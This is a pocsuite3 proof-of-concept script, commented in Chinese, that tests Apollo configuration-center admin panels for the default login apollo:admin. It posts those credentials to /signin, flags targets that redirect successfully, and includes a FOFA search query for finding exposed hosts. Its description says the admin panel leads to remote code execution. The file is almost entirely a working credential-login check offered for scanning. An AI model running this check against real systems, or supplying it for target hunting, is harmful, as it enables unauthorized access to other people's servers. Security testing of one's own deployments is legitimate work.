from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)


# 关于类的继承
class ApolloPoc(POCBase):
    # fofa语句: title="任务调度中心"
    vulID = "0"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "derian"  # PoC作者的大名
    vulDate = "2021-11-11"  # 漏洞公开的时间,不知道就写今天
    createDate = "2021-11-11"  # 编写 PoC 的日期
    updateDate = "2021-11-11"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://github.com/apolloconfig/apollo"]  # 漏洞地址来源,0day不用写
    name = "apollo 后台存在弱口令漏洞 PoC"  # PoC 名称
    appPowerLink = "https://github.com/apolloconfig/apollo"  # 漏洞厂商主页地址
    appName = "apollo"  # 漏洞应用名称
    appVersion = "all"  # 漏洞影响版本
    vulType = VUL_TYPE.WEAK_PASSWORD  # 弱口令 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP  # poc对应的产品类型 web的
    # samples = []  # 测试样列,就是用 PoC 测试成功的网站
    # install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """apollo后台管理存在弱口令,导致任意用户可以轻易爆破出来登录后台,通过后台的功能点远程代码执行。"""  # 漏洞简要描述
    pocDesc = """apollo:admin"""  # POC用法描述

    def _check(self):
        url = self.url.strip()
        # 漏洞验证代码
        full_url = f"{url}/signin"
        cookies = {"NG_TRANSLATE_LANG_KEY": "zh-CN", "JSESSIONID": "7D7571D40E4C16EC46C0C84FB3340E80"}
        headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
                   "Origin": f"{url}", "Content-Type": "application/x-www-form-urlencoded",
                   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                   "Referer": f"{url}/signin", "Accept-Encoding": "gzip, deflate",
                   "Accept-Language": "zh-CN,zh;q=0.9,ja;q=0.8", "Connection": "close"}
        data = {"username": "apollo", "password": "admin", "login-submit": "\xe7\x99\xbb\xe5\xbd\x95"}
        result = []
        # 一个异常处理 , 生怕站点关闭了 , 请求不到 , 代码报错不能运行
        try:
            response = requests.post(full_url, headers=headers, cookies=cookies, verify=False, timeout=5, data=data,
                                     allow_redirects=False)
            location = response.headers.get("Location", "error")
            # 判断是否存在漏洞
            if "error" not in location:
                result.append(url)
        except Exception as e:
            print(e)
        # 跟 try ... except是一对的 , 最终一定会执行里面的代码 , 不管你是否报错
        finally:
            return result

    def _verify(self):
        # 验证模式 , 调用检查代码 ,
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            # 这些信息会在终端上显示
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.pocDesc
        return self.parse_verify(result)

    def _attack(self):
        # 攻击模式 , 就是在调用验证模式
        return self._verify()

    def parse_verify(self, result):
        # 解析认证 , 输出
        output = Output(self)
        # 根据result的bool值判断是否有漏洞
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


# 你会发现没有shell模式 , 对吧 ,根本就用不到

# 其他自定义的可添加的功能函数
def other_fuc():
    pass


# 其他工具函数
def other_utils_func():
    pass


# 注册 DemoPOC 类 , 必须要注册
register_poc(ApolloPoc)
